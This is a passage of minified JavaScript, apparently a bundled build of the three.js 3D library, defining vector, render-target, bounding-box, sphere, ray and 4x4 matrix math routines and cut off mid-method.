x>S&&x>E?x<.01?(i=0,s=.707106781,r=.707106781):(i=Math.sqrt(x),s=A/i,r=C/i):S>E?S<.01?(i=.707106781,s=0,r=.707106781):(s=Math.sqrt(S),i=A/s,r=L/s):E<.01?(i=.707106781,s=.707106781,r=0):(r=Math.sqrt(E),i=C/r,s=L/r),this.set(i,s,r,n),this}let v=Math.sqrt((g-y)*(g-y)+(d-_)*(d-_)+(p-h)*(p-h));return Math.abs(v)<.001&&(v=1),this.x=(g-y)/v,this.y=(d-_)/v,this.z=(p-h)/v,this.w=Math.acos((c+f+u-1)/2),this}setFromMatrixPosition(e){const n=e.elements;return this.x=n[12],this.y=n[13],this.z=n[14],this.w=n[15],this}min(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this.z=Math.min(this.z,e.z),this.w=Math.min(this.w,e.w),this}max(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this.z=Math.max(this.z,e.z),this.w=Math.max(this.w,e.w),this}clamp(e,n){return this.x=Ge(this.x,e.x,n.x),this.y=Ge(this.y,e.y,n.y),this.z=Ge(this.z,e.z,n.z),this.w=Ge(this.w,e.w,n.w),this}clampScalar(e,n){return this.x=Ge(this.x,e,n),this.y=Ge(this.y,e,n),this.z=Ge(this.z,e,n),this.w=Ge(this.w,e,n),this}clampLength(e,n){const i=this.length();return this.divideScalar(i||1).multiplyScalar(Ge(i,e,n))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this.w=Math.floor(this.w),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this.w=Math.ceil(this.w),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this.w=Math.round(this.w),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this.z=Math.trunc(this.z),this.w=Math.trunc(this.w),this}negate(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this.w=-this.w,this}dot(e){return this.x*e.x+this.y*e.y+this.z*e.z+this.w*e.w}lengthSq(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w}length(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)}normalize(){return this.divideScalar(this.length()||1)}setLength(e){return this.normalize().multiplyScalar(e)}lerp(e,n){return this.x+=(e.x-this.x)*n,this.y+=(e.y-this.y)*n,this.z+=(e.z-this.z)*n,this.w+=(e.w-this.w)*n,this}lerpVectors(e,n,i){return this.x=e.x+(n.x-e.x)*i,this.y=e.y+(n.y-e.y)*i,this.z=e.z+(n.z-e.z)*i,this.w=e.w+(n.w-e.w)*i,this}equals(e){return e.x===this.x&&e.y===this.y&&e.z===this.z&&e.w===this.w}fromArray(e,n=0){return this.x=e[n],this.y=e[n+1],this.z=e[n+2],this.w=e[n+3],this}toArray(e=[],n=0){return e[n]=this.x,e[n+1]=this.y,e[n+2]=this.z,e[n+3]=this.w,e}fromBufferAttribute(e,n){return this.x=e.getX(n),this.y=e.getY(n),this.z=e.getZ(n),this.w=e.getW(n),this}random(){return this.x=Math.random(),this.y=Math.random(),this.z=Math.random(),this.w=Math.random(),this}*[Symbol.iterator](){yield this.x,yield this.y,yield this.z,yield this.w}}class Xw extends Wr{constructor(e=1,n=1,i={}){super(),i=Object.assign({generateMipmaps:!1,internalFormat:null,minFilter:qt,depthBuffer:!0,stencilBuffer:!1,resolveDepthBuffer:!0,resolveStencilBuffer:!0,depthTexture:null,samples:0,count:1,depth:1,multiview:!1},i),this.isRenderTarget=!0,this.width=e,this.height=n,this.depth=i.depth,this.scissor=new bt(0,0,e,n),this.scissorTest=!1,this.viewport=new bt(0,0,e,n);const s={width:e,height:n,depth:i.depth},r=new Yt(s);this.textures=[];const a=i.count;for(let o=0;o<a;o++)this.textures[o]=r.clone(),this.textures[o].isRenderTargetTexture=!0,this.textures[o].renderTarget=this;this._setTextureOptions(i),this.depthBuffer=i.depthBuffer,this.stencilBuffer=i.stencilBuffer,this.resolveDepthBuffer=i.resolveDepthBuffer,this.resolveStencilBuffer=i.resolveStencilBuffer,this._depthTexture=null,this.depthTexture=i.depthTexture,this.samples=i.samples,this.multiview=i.multiview}_setTextureOptions(e={}){const n={minFilter:qt,generateMipmaps:!1,flipY:!1,internalFormat:null};e.mapping!==void 0&&(n.mapping=e.mapping),e.wrapS!==void 0&&(n.wrapS=e.wrapS),e.wrapT!==void 0&&(n.wrapT=e.wrapT),e.wrapR!==void 0&&(n.wrapR=e.wrapR),e.magFilter!==void 0&&(n.magFilter=e.magFilter),e.minFilter!==void 0&&(n.minFilter=e.minFilter),e.format!==void 0&&(n.format=e.format),e.type!==void 0&&(n.type=e.type),e.anisotropy!==void 0&&(n.anisotropy=e.anisotropy),e.colorSpace!==void 0&&(n.colorSpace=e.colorSpace),e.flipY!==void 0&&(n.flipY=e.flipY),e.generateMipmaps!==void 0&&(n.generateMipmaps=e.generateMipmaps),e.internalFormat!==void 0&&(n.internalFormat=e.internalFormat);for(let i=0;i<this.textures.length;i++)this.textures[i].setValues(n)}get texture(){return this.textures[0]}set texture(e){this.textures[0]=e}set depthTexture(e){this._depthTexture!==null&&(this._depthTexture.renderTarget=null),e!==null&&(e.renderTarget=this),this._depthTexture=e}get depthTexture(){return this._depthTexture}setSize(e,n,i=1){if(this.width!==e||this.height!==n||this.depth!==i){this.width=e,this.height=n,this.depth=i;for(let s=0,r=this.textures.length;s<r;s++)this.textures[s].image.width=e,this.textures[s].image.height=n,this.textures[s].image.depth=i,this.textures[s].isData3DTexture!==!0&&(this.textures[s].isArrayTexture=this.textures[s].image.depth>1);this.dispose()}this.viewport.set(0,0,e,n),this.scissor.set(0,0,e,n)}clone(){return new this.constructor().copy(this)}copy(e){this.width=e.width,this.height=e.height,this.depth=e.depth,this.scissor.copy(e.scissor),this.scissorTest=e.scissorTest,this.viewport.copy(e.viewport),this.textures.length=0;for(let n=0,i=e.textures.length;n<i;n++){this.textures[n]=e.textures[n].clone(),this.textures[n].isRenderTargetTexture=!0,this.textures[n].renderTarget=this;const s=Object.assign({},e.textures[n].image);this.textures[n].source=new bp(s)}return this.depthBuffer=e.depthBuffer,this.stencilBuffer=e.stencilBuffer,this.resolveDepthBuffer=e.resolveDepthBuffer,this.resolveStencilBuffer=e.resolveStencilBuffer,e.depthTexture!==null&&(this.depthTexture=e.depthTexture.clone()),this.samples=e.samples,this}dispose(){this.dispatchEvent({type:"dispose"})}}class ci extends Xw{constructor(e=1,n=1,i={}){super(e,n,i),this.isWebGLRenderTarget=!0}}class sy extends Yt{constructor(e=null,n=1,i=1,s=1){super(null),this.isDataArrayTexture=!0,this.image={data:e,width:n,height:i,depth:s},this.magFilter=Bt,this.minFilter=Bt,this.wrapR=Ti,this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1,this.layerUpdates=new Set}addLayerUpdate(e){this.layerUpdates.add(e)}clearLayerUpdates(){this.layerUpdates.clear()}}class qw extends Yt{constructor(e=null,n=1,i=1,s=1){super(null),this.isData3DTexture=!0,this.image={data:e,width:n,height:i,depth:s},this.magFilter=Bt,this.minFilter=Bt,this.wrapR=Ti,this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1}}class ro{constructor(e=new G(1/0,1/0,1/0),n=new G(-1/0,-1/0,-1/0)){this.isBox3=!0,this.min=e,this.max=n}set(e,n){return this.min.copy(e),this.max.copy(n),this}setFromArray(e){this.makeEmpty();for(let n=0,i=e.length;n<i;n+=3)this.expandByPoint(Fn.fromArray(e,n));return this}setFromBufferAttribute(e){this.makeEmpty();for(let n=0,i=e.count;n<i;n++)this.expandByPoint(Fn.fromBufferAttribute(e,n));return this}setFromPoints(e){this.makeEmpty();for(let n=0,i=e.length;n<i;n++)this.expandByPoint(e[n]);return this}setFromCenterAndSize(e,n){const i=Fn.copy(n).multiplyScalar(.5);return this.min.copy(e).sub(i),this.max.copy(e).add(i),this}setFromObject(e,n=!1){return this.makeEmpty(),this.expandByObject(e,n)}clone(){return new this.constructor().copy(this)}copy(e){return this.min.copy(e.min),this.max.copy(e.max),this}makeEmpty(){return this.min.x=this.min.y=this.min.z=1/0,this.max.x=this.max.y=this.max.z=-1/0,this}isEmpty(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z}getCenter(e){return this.isEmpty()?e.set(0,0,0):e.addVectors(this.min,this.max).multiplyScalar(.5)}getSize(e){return this.isEmpty()?e.set(0,0,0):e.subVectors(this.max,this.min)}expandByPoint(e){return this.min.min(e),this.max.max(e),this}expandByVector(e){return this.min.sub(e),this.max.add(e),this}expandByScalar(e){return this.min.addScalar(-e),this.max.addScalar(e),this}expandByObject(e,n=!1){e.updateWorldMatrix(!1,!1);const i=e.geometry;if(i!==void 0){const r=i.getAttribute("position");if(n===!0&&r!==void 0&&e.isInstancedMesh!==!0)for(let a=0,o=r.count;a<o;a++)e.isMesh===!0?e.getVertexPosition(a,Fn):Fn.fromBufferAttribute(r,a),Fn.applyMatrix4(e.matrixWorld),this.expandByPoint(Fn);else e.boundingBox!==void 0?(e.boundingBox===null&&e.computeBoundingBox(),Lo.copy(e.boundingBox)):(i.boundingBox===null&&i.computeBoundingBox(),Lo.copy(i.boundingBox)),Lo.applyMatrix4(e.matrixWorld),this.union(Lo)}const s=e.children;for(let r=0,a=s.length;r<a;r++)this.expandByObject(s[r],n);return this}containsPoint(e){return e.x>=this.min.x&&e.x<=this.max.x&&e.y>=this.min.y&&e.y<=this.max.y&&e.z>=this.min.z&&e.z<=this.max.z}containsBox(e){return this.min.x<=e.min.x&&e.max.x<=this.max.x&&this.min.y<=e.min.y&&e.max.y<=this.max.y&&this.min.z<=e.min.z&&e.max.z<=this.max.z}getParameter(e,n){return n.set((e.x-this.min.x)/(this.max.x-this.min.x),(e.y-this.min.y)/(this.max.y-this.min.y),(e.z-this.min.z)/(this.max.z-this.min.z))}intersectsBox(e){return e.max.x>=this.min.x&&e.min.x<=this.max.x&&e.max.y>=this.min.y&&e.min.y<=this.max.y&&e.max.z>=this.min.z&&e.min.z<=this.max.z}intersectsSphere(e){return this.clampPoint(e.center,Fn),Fn.distanceToSquared(e.center)<=e.radius*e.radius}intersectsPlane(e){let n,i;return e.normal.x>0?(n=e.normal.x*this.min.x,i=e.normal.x*this.max.x):(n=e.normal.x*this.max.x,i=e.normal.x*this.min.x),e.normal.y>0?(n+=e.normal.y*this.min.y,i+=e.normal.y*this.max.y):(n+=e.normal.y*this.max.y,i+=e.normal.y*this.min.y),e.normal.z>0?(n+=e.normal.z*this.min.z,i+=e.normal.z*this.max.z):(n+=e.normal.z*this.max.z,i+=e.normal.z*this.min.z),n<=-e.constant&&i>=-e.constant}intersectsTriangle(e){if(this.isEmpty())return!1;this.getCenter(ia),Po.subVectors(this.max,ia),$s.subVectors(e.a,ia),Ks.subVectors(e.b,ia),Zs.subVectors(e.c,ia),Fi.subVectors(Ks,$s),Bi.subVectors(Zs,Ks),ys.subVectors($s,Zs);let n=[0,-Fi.z,Fi.y,0,-Bi.z,Bi.y,0,-ys.z,ys.y,Fi.z,0,-Fi.x,Bi.z,0,-Bi.x,ys.z,0,-ys.x,-Fi.y,Fi.x,0,-Bi.y,Bi.x,0,-ys.y,ys.x,0];return!eu(n,$s,Ks,Zs,Po)||(n=[1,0,0,0,1,0,0,0,1],!eu(n,$s,Ks,Zs,Po))?!1:(No.crossVectors(Fi,Bi),n=[No.x,No.y,No.z],eu(n,$s,Ks,Zs,Po))}clampPoint(e,n){return n.copy(e).clamp(this.min,this.max)}distanceToPoint(e){return this.clampPoint(e,Fn).distanceTo(e)}getBoundingSphere(e){return this.isEmpty()?e.makeEmpty():(this.getCenter(e.center),e.radius=this.getSize(Fn).length()*.5),e}intersect(e){return this.min.max(e.min),this.max.min(e.max),this.isEmpty()&&this.makeEmpty(),this}union(e){return this.min.min(e.min),this.max.max(e.max),this}applyMatrix4(e){return this.isEmpty()?this:(mi[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(e),mi[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(e),mi[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(e),mi[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(e),mi[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(e),mi[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(e),mi[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(e),mi[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(e),this.setFromPoints(mi),this)}translate(e){return this.min.add(e),this.max.add(e),this}equals(e){return e.min.equals(this.min)&&e.max.equals(this.max)}toJSON(){return{min:this.min.toArray(),max:this.max.toArray()}}fromJSON(e){return this.min.fromArray(e.min),this.max.fromArray(e.max),this}}const mi=[new G,new G,new G,new G,new G,new G,new G,new G],Fn=new G,Lo=new ro,$s=new G,Ks=new G,Zs=new G,Fi=new G,Bi=new G,ys=new G,ia=new G,Po=new G,No=new G,xs=new G;function eu(t,e,n,i,s){for(let r=0,a=t.length-3;r<=a;r+=3){xs.fromArray(t,r);const o=s.x*Math.abs(xs.x)+s.y*Math.abs(xs.y)+s.z*Math.abs(xs.z),l=e.dot(xs),c=n.dot(xs),h=i.dot(xs);if(Math.max(-Math.max(l,c,h),Math.min(l,c,h))>o)return!1}return!0}const Yw=new ro,sa=new G,tu=new G;class Sp{constructor(e=new G,n=-1){this.isSphere=!0,this.center=e,this.radius=n}set(e,n){return this.center.copy(e),this.radius=n,this}setFromPoints(e,n){const i=this.center;n!==void 0?i.copy(n):Yw.setFromPoints(e).getCenter(i);let s=0;for(let r=0,a=e.length;r<a;r++)s=Math.max(s,i.distanceToSquared(e[r]));return this.radius=Math.sqrt(s),this}copy(e){return this.center.copy(e.center),this.radius=e.radius,this}isEmpty(){return this.radius<0}makeEmpty(){return this.center.set(0,0,0),this.radius=-1,this}containsPoint(e){return e.distanceToSquared(this.center)<=this.radius*this.radius}distanceToPoint(e){return e.distanceTo(this.center)-this.radius}intersectsSphere(e){const n=this.radius+e.radius;return e.center.distanceToSquared(this.center)<=n*n}intersectsBox(e){return e.intersectsSphere(this)}intersectsPlane(e){return Math.abs(e.distanceToPoint(this.center))<=this.radius}clampPoint(e,n){const i=this.center.distanceToSquared(e);return n.copy(e),i>this.radius*this.radius&&(n.sub(this.center).normalize(),n.multiplyScalar(this.radius).add(this.center)),n}getBoundingBox(e){return this.isEmpty()?(e.makeEmpty(),e):(e.set(this.center,this.center),e.expandByScalar(this.radius),e)}applyMatrix4(e){return this.center.applyMatrix4(e),this.radius=this.radius*e.getMaxScaleOnAxis(),this}translate(e){return this.center.add(e),this}expandByPoint(e){if(this.isEmpty())return this.center.copy(e),this.radius=0,this;sa.subVectors(e,this.center);const n=sa.lengthSq();if(n>this.radius*this.radius){const i=Math.sqrt(n),s=(i-this.radius)*.5;this.center.addScaledVector(sa,s/i),this.radius+=s}return this}union(e){return e.isEmpty()?this:this.isEmpty()?(this.copy(e),this):(this.center.equals(e.center)===!0?this.radius=Math.max(this.radius,e.radius):(tu.subVectors(e.center,this.center).setLength(e.radius),this.expandByPoint(sa.copy(e.center).add(tu)),this.expandByPoint(sa.copy(e.center).sub(tu))),this)}equals(e){return e.center.equals(this.center)&&e.radius===this.radius}clone(){return new this.constructor().copy(this)}toJSON(){return{radius:this.radius,center:this.center.toArray()}}fromJSON(e){return this.radius=e.radius,this.center.fromArray(e.center),this}}const gi=new G,nu=new G,Io=new G,zi=new G,iu=new G,Do=new G,su=new G;class $w{constructor(e=new G,n=new G(0,0,-1)){this.origin=e,this.direction=n}set(e,n){return this.origin.copy(e),this.direction.copy(n),this}copy(e){return this.origin.copy(e.origin),this.direction.copy(e.direction),this}at(e,n){return n.copy(this.origin).addScaledVector(this.direction,e)}lookAt(e){return this.direction.copy(e).sub(this.origin).normalize(),this}recast(e){return this.origin.copy(this.at(e,gi)),this}closestPointToPoint(e,n){n.subVectors(e,this.origin);const i=n.dot(this.direction);return i<0?n.copy(this.origin):n.copy(this.origin).addScaledVector(this.direction,i)}distanceToPoint(e){return Math.sqrt(this.distanceSqToPoint(e))}distanceSqToPoint(e){const n=gi.subVectors(e,this.origin).dot(this.direction);return n<0?this.origin.distanceToSquared(e):(gi.copy(this.origin).addScaledVector(this.direction,n),gi.distanceToSquared(e))}distanceSqToSegment(e,n,i,s){nu.copy(e).add(n).multiplyScalar(.5),Io.copy(n).sub(e).normalize(),zi.copy(this.origin).sub(nu);const r=e.distanceTo(n)*.5,a=-this.direction.dot(Io),o=zi.dot(this.direction),l=-zi.dot(Io),c=zi.lengthSq(),h=Math.abs(1-a*a);let d,p,f,y;if(h>0)if(d=a*l-o,p=a*o-l,y=r*h,d>=0)if(p>=-y)if(p<=y){const _=1/h;d*=_,p*=_,f=d*(d+a*p+2*o)+p*(a*d+p+2*l)+c}else p=r,d=Math.max(0,-(a*p+o)),f=-d*d+p*(p+2*l)+c;else p=-r,d=Math.max(0,-(a*p+o)),f=-d*d+p*(p+2*l)+c;else p<=-y?(d=Math.max(0,-(-a*r+o)),p=d>0?-r:Math.min(Math.max(-r,-l),r),f=-d*d+p*(p+2*l)+c):p<=y?(d=0,p=Math.min(Math.max(-r,-l),r),f=p*(p+2*l)+c):(d=Math.max(0,-(a*r+o)),p=d>0?r:Math.min(Math.max(-r,-l),r),f=-d*d+p*(p+2*l)+c);else p=a>0?-r:r,d=Math.max(0,-(a*p+o)),f=-d*d+p*(p+2*l)+c;return i&&i.copy(this.origin).addScaledVector(this.direction,d),s&&s.copy(nu).addScaledVector(Io,p),f}intersectSphere(e,n){gi.subVectors(e.center,this.origin);const i=gi.dot(this.direction),s=gi.dot(gi)-i*i,r=e.radius*e.radius;if(s>r)return null;const a=Math.sqrt(r-s),o=i-a,l=i+a;return l<0?null:o<0?this.at(l,n):this.at(o,n)}intersectsSphere(e){return e.radius<0?!1:this.distanceSqToPoint(e.center)<=e.radius*e.radius}distanceToPlane(e){const n=e.normal.dot(this.direction);if(n===0)return e.distanceToPoint(this.origin)===0?0:null;const i=-(this.origin.dot(e.normal)+e.constant)/n;return i>=0?i:null}intersectPlane(e,n){const i=this.distanceToPlane(e);return i===null?null:this.at(i,n)}intersectsPlane(e){const n=e.distanceToPoint(this.origin);return n===0||e.normal.dot(this.direction)*n<0}intersectBox(e,n){let i,s,r,a,o,l;const c=1/this.direction.x,h=1/this.direction.y,d=1/this.direction.z,p=this.origin;return c>=0?(i=(e.min.x-p.x)*c,s=(e.max.x-p.x)*c):(i=(e.max.x-p.x)*c,s=(e.min.x-p.x)*c),h>=0?(r=(e.min.y-p.y)*h,a=(e.max.y-p.y)*h):(r=(e.max.y-p.y)*h,a=(e.min.y-p.y)*h),i>a||r>s||((r>i||isNaN(i))&&(i=r),(a<s||isNaN(s))&&(s=a),d>=0?(o=(e.min.z-p.z)*d,l=(e.max.z-p.z)*d):(o=(e.max.z-p.z)*d,l=(e.min.z-p.z)*d),i>l||o>s)||((o>i||i!==i)&&(i=o),(l<s||s!==s)&&(s=l),s<0)?null:this.at(i>=0?i:s,n)}intersectsBox(e){return this.intersectBox(e,gi)!==null}intersectTriangle(e,n,i,s,r){iu.subVectors(n,e),Do.subVectors(i,e),su.crossVectors(iu,Do);let a=this.direction.dot(su),o;if(a>0){if(s)return null;o=1}else if(a<0)o=-1,a=-a;else return null;zi.subVectors(this.origin,e);const l=o*this.direction.dot(Do.crossVectors(zi,Do));if(l<0)return null;const c=o*this.direction.dot(iu.cross(zi));if(c<0||l+c>a)return null;const h=-o*zi.dot(su);return h<0?null:this.at(h/a,r)}applyMatrix4(e){return this.origin.applyMatrix4(e),this.direction.transformDirection(e),this}equals(e){return e.origin.equals(this.origin)&&e.direction.equals(this.direction)}clone(){return new this.constructor().copy(this)}}class St{constructor(e,n,i,s,r,a,o,l,c,h,d,p,f,y,_,g){St.prototype.isMatrix4=!0,this.elements=[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1],e!==void 0&&this.set(e,n,i,s,r,a,o,l,c,h,d,p,f,y,_,g)}set(e,n,i,s,r,a,o,l,c,h,d,p,f,y,_,g){const u=this.elements;return u[0]=e,u[4]=n,u[8]=i,u[12]=s,u[1]=r,u[5]=a,u[9]=o,u[13]=l,u[2]=c,u[6]=h,u[10]=d,u[14]=p,u[3]=f,u[7]=y,u[11]=_,u[15]=g,this}identity(){return this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1),this}clone(){return new St().fromArray(this.elements)}copy(e){const n=this.elements,i=e.elements;return n[0]=i[0],n[1]=i[1],n[2]=i[2],n[3]=i[3],n[4]=i[4],n[5]=i[5],n[6]=i[6],n[7]=i[7],n[8]=i[8],n[9]=i[9],n[10]=i[10],n[11]=i[11],n[12]=i[12],n[13]=i[13],n[14]=i[14],n[15]=i[15],this}copyPosition(e){const n=this.elements,i=e.elements;return n[12]=i[12],n[13]=i[13],n[14]=i[14],this}setFromMatrix3(e){const n=e.elements;return this.set(n[0],n[3],n[6],0,n[1],n[4],n[7],0,n[2],n[5],n[8],0,0,0,0,1),this}extractBasis(e,n,i){return this.determinant()===0?(e.set(1,0,0),n.set(0,1,0),i.set(0,0,1),this):(e.setFromMatrixColumn(this,0),n.setFromMatrixColumn(this,1),i.setFromMatrixColumn(this,2),this)}makeBasis(e,n,i){return this.set(e.x,n.x,i.x,0,e.y,n.y,i.y,0,e.z,n.z,i.z,0,0,0,0,1),this}extractRotation(e){if(e.determinant()===0)return this.identity();const n=this.elements,i=e.elements,s=1/Js.setFromMatrixColumn(e,0).length(),r=1/Js.setFromMatrixColumn(e,1).length(),a=1/Js.setFromMatrixColumn(e,2).length();return n[0]=i[0]*s,n[1]=i[1]*s,n[2]=i[2]*s,n[3]=0,n[4]=i[4]*r,n[5]=i[5]*r,n[6]=i[6]*r,n[7]=0,n[8]=i[8]*a,n[9]=i[9]*a,n[10]=i[10]*a,n[11]=0,n[12]=0,n[13]=0,n[14]=0,n[15]=1,this}makeRotationFromEuler(e){const n=this.elements,i=e.x,s=e.y,r=e.z,a=Math.cos(i),o=Math.sin(i),l=Math.cos(s),c=Math.sin(s),h=Math.cos(r),d=Math.sin(r);if(e.order==="XYZ"){const p=a*h,f=a*d,y=o*h,_=o*d;n[0]=l*h,n[4]=-l*d,n[8]=c,n[1]=f+y*c,n[5]=p-_*c,n[9]=-o*l,n[2]=_-p*c,n[6]=y+f*c,n[10]=a*l}else if(e.order==="YXZ"){const p=l*h,f=l*d,y=c*h,_=c*d;n[0]=p+_*o,n[4]=y*o-f,n[8]=a*c,n[1]=a*d,n[5]=a*h,n[9]=-o,n[2]=f*o-y,n[6]=_+p*o,n[10]=a*l}else if(e.order==="ZXY"){const p=l*h,f=l*d,y=c*h,_=c*d;n[0]=p-_*o,n[4]=-a*d,n[8]=y+f*o,n[1]=f+y*o,n[5]=a*h,n[9]=_-p*o,n[2]=-a*c,n[6]=o,n[10]=a*l}else if(e.order==="ZYX"){const p=a*h,f=a*d,y=o*h,_=o*d;n[0]=l*h,n[4]=y*c-f,n[8]=p*c+_,n[1]=l*d,n[5]=_*c+p,n[9]=f*c-y,n[2]=-c,n[6]=o*l,n[10]=a*l}else if(e.order==="YZX"){const p=a*l,f=a*c,y=o*l,_=o*c;n[0]=l*h,n[4]=_-p*d,n[8]=y*d+f,n[1]=d,n[5]=a*h,n[9]=-o*h,n[2]=-c*h,n[6]=f*d+y,n[10]=p-_*d}else if(e.order==="XZY"){const p=a*l,f=a*c,y=o*l,_=o*c;n[0]=l*h,n[4]=-d,n[8]=c*h,n[1]=p*d+_,n[5]=a*h,n[9]=f*d-y,n[2]=y*d-f,n[6]=o*h,n[10]=_*d+p}return n[3]=0,n[7]=0,n[11]=0,n[12]=0,n[13]=0,n[14]=0,n[15]=1,this}makeRotationFromQuaternion(e){return this.compose(Kw,e,Zw)}lookAt(e,n,i){const s=this.elements;return gn.subVectors(e,n),gn.lengthSq()===0&&(gn.z=1),gn.normalize(),Vi.crossVectors(i,gn),Vi.lengthSq()===0&&(Math.abs(i.z)===1?gn.x+=1e-4:gn.z+=1e-4,gn.normalize(),Vi.crossVectors(i,gn)),Vi.normalize(),Uo.crossVectors(gn,Vi),s[0]=Vi.x,s[4]=Uo.x,s[8]=gn.x,s[1]=Vi.y,s[5]=Uo.y,s[9]=gn.y,s[2]=Vi.z,s[6]=Uo.z,s[10]=gn.z,this}multiply(e){return this.multiplyMatrices(this,e)}premultiply(e){return this.multiplyMatrices(e,this)}multiplyMatrices(e,n){const i=e.elements,s=n.elements,r=this.elements,a=i[0],o=i[4],l=i[8],c=i[12],h=i[1],d=i[5],p=i[9],f=i[13],y=i[2],_=i[6],g=i[10],u=i[14],v=i[3],x=i[7],S=i[11],E=i[15],A=s[0],C=s[4],L=s[8],w=s[12],M=s[1],k=s[5],H=s[9],V=s[13],W=s[2],j=s[6],X=s[10],D=s[14],N=s[3],O=s[7],B=s[11],J=s[15];return r[0]=a*A+o*M+l*W+c*N,r[4]=a*C+o*k+l*j+c*O,r[8]=a*L+o*H+l*X+c*B,r[12]=a*w+o*V+l*D+c*J,r[1]=h*A+d*M+p*W+f*N,r[5]=h*C+d*k+p*j+f*O,r[9]=h*L+d*H+p*X+f*B,r[13]=h*w+d*V+p*D+f*J,r[2]=y*A+_*M+g*W+u*N,r[6]=y*C+_*k+g*j+u*O,r[10]=y*L+_*H+g*X+u*B,r[14]=y*w+_*V+g*D+u*J,r[3]=v*A+x*M+S*W+E*N,r[7]=v*C+x*k+S*j+E*O,r[11]=v*L+x*H+S*X+E*B,r[15]=v*w+x*V+S*D+E*J,this}multiplyScalar(e){const n=this.elements;return n[0]*=e,n[4]*=e,n[8]*=e,n[12]*=e,n[1]*=e,n[5]*=e,n[9]*=e,n[13]*=e,n[2]*=e,n[6]*=e,n[10]*=e,n[14]*=e,n[3]*=e,n[7]*=e,n[11]*=e,n[15]*=e,this}determinant(){const e=this.elements,n=e[0],i=e[4],s=e[8],r=e[12],a=e[1],o=e[5],l=e[9],c=e[13],h=e[2],d=e[6],p=e[10],f=e[14],y=e[3],_=e[7],g=e[11],u=e[15],v=l*f-c*p,x=o*f-c*d,S=o*p-l*d,E=a*f-c*h,A=a*p-l*h,C=a*d-o*h;return n*(_*v-g*x+u*S)-i*(y*v-g*E+u*A)+s*(y*x-_*E+u*C)-r*(y*S-_*A+g*C)}transpose(){const e=this.elements;let n;return n=e[1],e[1]=e[4],e[4]=n,n=e[2],e[2]=e[8],e[8]=n,n=e[6],e[6]=e[9],e[9]=n,n=e[3],e[3]=e[12],e[12]=n,n=e[7],e[7]=e[13],e[13]=n,n=e[11],e[11]=e[14],e[14]=n,this}setPosition(e,n,i){const s=this.elements;return e.isVector3?(s[12]=e.x,s[13]=e.y,s[14]=e.z):(s[12]=e,s[13]=n,s[14]=i),this}invert(){const e=this.elements,n=e[0],i=e[1],s=e[2],r=e[3],a=e[4],o=e[5],l=e[6],c=e[7],h=e[8],d=e[9],p=e[10],f=e[11],y=e[12],_=e[13],g=e[14],u=e[15],v=d*g*c-_*p*c+_*l*f-o*g*f-d*l*u+o*p*u,x=y*p*c-h*g*c-y*l*f+a*g*f+h*l*u-a*p*u,S=h*_*c-y*d*c+y*o*f-a*_*f-h*o*u+a*d*u,E=y*d*l-h*_*l-y*o*p+a*_*p+h*o*g-a*d*g,A=n*v+i*x+s*S+r*E;if(A===0)return this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);const C=1/A;return e[0]=v*C,e[1]=(_*p*r-d*g*r-_*s*f+i*g*f+d*s*u-i*p*u)*C,e[2]=(o*g*r-_*l*r+_*s*c-i*g*c-o*s*u+i*l*u)*C,e[3]=(d*l*r-o*p*r-d*s*c+i*p*c+o*s*f-i*l*f)*C,e[4]=x*C,e[5]=(h*g*r-y*p*r+y*s*f-n*g*f-h*s*u+n*p*u)*C,e[6]=(y*l*r-a*g*r-y*s*c+n*g*c+a*s*u-n*l*u)*C,e[7]=(a*p*r-h*l*r+h*s*c-n*p*c-a*s*f+n*l*f)*C,e[8]=S*C,e[9]=(y*d*r-h*_*r-y*i*f+n*_*f+h*i*u-n*d*u)*C,e[10]=(a*_*r-y*o*r+y*i*c-n*_*c-a*i*u+n*o*u)*C,e[11]=(h*o*r-a*d*r-h*i*c+n*d*c+a*i*f-n*o*f)*C,e[12]=E*C,e[13]=(h*_*s-y*d*s+y*i*p-n*_*p-h*i*g+n*d*g)*C,e[14]=(y*o*s-a*_*s-y*i*l+n*_*l+a*i*g-n*o*g)*C,e[15]=(a*d*s-h*o*s+h*i*l-n*d*l-a*i*p+n*o*p)*C,this}scale(e){const n=this.elements,i=e.x,s=e.y,r=e.z;return n[0]*=i,n[4]*=s,n[8]*=r,n[1]*=i,n[5]*=s,n[9]*=r,n[2]*=i,n[6]*=s,n[10]*=r,n[3]*=i,n[7]*=s,n[11]*=r,this}getMaxScaleOnAxis(){const e=this.elements,n=e[0]*e[0]+e[1]*e[1]+e[2]*e[2],i=e[4]*e[4]+e[5]*e[5]+e[6]*e[6],s=e[8]*e[8]+e[9]*e[9]+e[10]*e[10];return Math.sqrt(Math.max(n,i,s))}makeTranslation(e,n,i){return e.isVector3?this.set(1,0,0,e.x,0,1,0,e.y,0,0,1,e.z,0,0,0,1):this.set(1,0,0,e,0,1,0,n,0,0,1,i,0,0,0,1),this}makeRotationX(e){const n=Math.cos(e),i=Math.sin(e);return this.set(1,0,0,0,0,n,-i,0,0,i,n,0,0,0,0,1),this}makeRotationY(e){const n=Math.cos(e),i=Math.sin(e);return 